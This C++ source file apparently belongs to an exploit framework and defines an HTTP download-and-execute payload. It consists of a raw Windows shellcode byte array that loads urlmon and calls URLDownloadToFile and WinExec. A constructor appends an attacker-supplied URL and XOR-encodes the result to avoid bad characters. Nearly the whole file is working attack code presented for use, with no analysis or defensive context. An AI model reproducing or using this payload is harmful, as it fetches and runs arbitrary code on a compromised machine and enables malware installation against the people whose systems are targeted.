#include <winsock2.h>
#include "payload_httpexec.h"

UCHAR HTTPExecShellcode[] =
"\xE8\x56\x00\x00\x00\x53\x55\x56\x57\x8B\x6C\x24"
"\x18\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A"
"\x18\x8B\x5A\x20\x01\xEB\xE3\x32\x49\x8B\x34\x8B"
"\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38\xE0\x74\x07"
"\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75"
"\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A"
"\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0"
"\x5F\x5E\x5D\x5B\xC2\x08\x00\x5E\x6A\x30\x59\x64"
"\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B\x1B\x8B\x5B"
"\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\x53"
"\xE8\x2F\x00\x00\x00\x5B\x6A\x00\xE8\x4F\x00\x00"
"\x00\x8D\x40\x21\x50\x53\x68\x98\xFE\x8A\x0E\xFF"
"\xD6\xFF\xD0\x53\x68\xEF\xCE\xE0\x60\xFF\xD6\x6A"
"\x00\xFF\xD0\x75\x72\x6C\x6D\x6F\x6E\x00\x54\x2E"
"\x45\x58\x45\x00\x5B\x53\x8D\x4B\x22\x51\xFF\xD7"
"\x50\x68\x36\x1A\x2F\x70\xFF\xD6\x89\xC2\x6A\x00"
"\x6A\x00\x8D\x4B\x29\x51\xE8\x09\x00\x00\x00\x8D"
"\x48\x0C\x51\x6A\x00\xFF\xD2\xC3\x58\x50\xC3";

PayloadHTTPExec::PayloadHTTPExec(PCHAR URL){
	PCHAR Shellcode = AllocateShellcode(sizeof(HTTPExecShellcode) - 1 + strlen(URL) + 1);
	memcpy(Shellcode, HTTPExecShellcode, sizeof(HTTPExecShellcode) - 1);
	memcpy(Shellcode + sizeof(HTTPExecShellcode) - 1, URL, strlen(URL) + 1);
	Xor("\x00\x0a\x0d\x5c\x5f\x2f\x2e", 7);
}